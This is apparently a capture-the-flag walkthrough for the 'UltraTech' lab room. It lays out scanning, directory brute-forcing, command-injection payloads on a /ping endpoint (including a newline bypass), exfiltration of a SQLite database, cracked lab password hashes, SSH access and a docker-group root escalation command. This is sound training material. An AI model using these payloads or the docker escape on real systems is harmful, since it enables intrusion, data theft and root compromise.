**H2 Techniques & Tools for UltraTech Room Walkthrough**  

---

### **1. Initial Reconnaissance**  
**Tools**:  
- **Nmap**:  
  - **Command**:  
    ```bash  
    sudo nmap -p- -sS <IP>  # Full port scan  
    sudo nmap -sV -sC -A -p21,22,8081,31331 <IP>  # Service/version detection  
    ```  
  - **Purpose**: Identify open ports (21/FTP, 22/SSH, 8081/Node.js, 31331/Apache).  

---

### **2. Web Server Enumeration**  
**Tools**:  
- **Dirb**:  
  - **Command**:  
    ```bash  
    dirb http://<IP>:8081  # Directory brute-forcing on port 8081  
    ```  
  - **Findings**: `/auth`, `/ping` endpoints.  
- **FFuf**:  
  - **Command**:  
    ```bash  
    ffuf -u http://<IP>:31331/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  
    ```  
  - **Findings**: `/js`, `/css` directories.  

---

### **3. Exploiting Command Injection**  
**Technique**:  
- **OS Command Injection** via `/ping` endpoint:  
  - **Payload**: `http://<IP>:8081/ping?ip=<IP>;COMMAND`  
  - **Example**:  
    ```bash  
    # Start Python server on target:  
    http://<IP>:8081/ping?ip=<IP>;python3 -m http.server 8000  
    # Download SQLite DB:  
    wget http://<IP>:8000/utech.db.sqlite  
    ```  

**Tools**:  
- **Python HTTP Server**: Host the SQLite file for exfiltration.  
- **Wget**: Fetch the database file.  

---

### **4. Credential Extraction & Cracking**  
**Tools**:  
- **SQLite3**:  
  - **Command**:  
    ```bash  
    sqlite3 utech.db.sqlite  
    .tables  # List tables  
    SELECT * FROM users;  # Extract hashes  
    ```  
  - **Output**:  
    ```  
    admin|0d0ea5111e3c1def594c1684e3b9be84 (Password: n100906)  
    r00t|f357a0c52799563c7c7b76c1e7543a32 (Password: n2g)  
    ```  
- **CrackStation**: Crack MD5 hashes (e.g., `n2g` for `r00t`).  

---

### **5. Initial Access via SSH**  
**Command**:  
```bash  
ssh r00t@<IP>  # Use password "n2g"  
```  

---

### **6. Privilege Escalation via Docker**  
**Technique**:  
- **Docker Group Exploit**:  
  - **Command**:  
    ```bash  
    docker run -v /:/mnt --rm -it bash chroot /mnt sh  
    ```  
  - **Breakdown**:  
    - `-v /:/mnt`: Mounts root filesystem to `/mnt` in the container.  
    - `chroot /mnt sh`: Escapes to host’s root shell.  

**Tools**:  
- **Docker**: Abuse group membership to gain root access.  

---

### **Alternative Command Injection Method**  
**Payload**:  
```  
http://<IP>:8081/ping?ip=<IP>%0a ls -la  
```  
- **Explanation**: `%0a` (URL-encoded newline) bypasses input sanitization.  

---

### **Key Takeaways**  
1. **Port Scanning**: Always use `nmap` for thorough service discovery.  
2. **Web Enumeration**: Tools like `dirb`/`ffuf` uncover hidden endpoints.  
3. **Command Injection**: Test parameters for OS command execution.  
4. **Credential Management**: Extract and crack hashes from exposed databases.  
5. **Docker Privileges**: Users in the `docker` group can escalate to root.  

**Pro Tip**: Always check group memberships (`id`) and SUID binaries for escalation paths! 🔍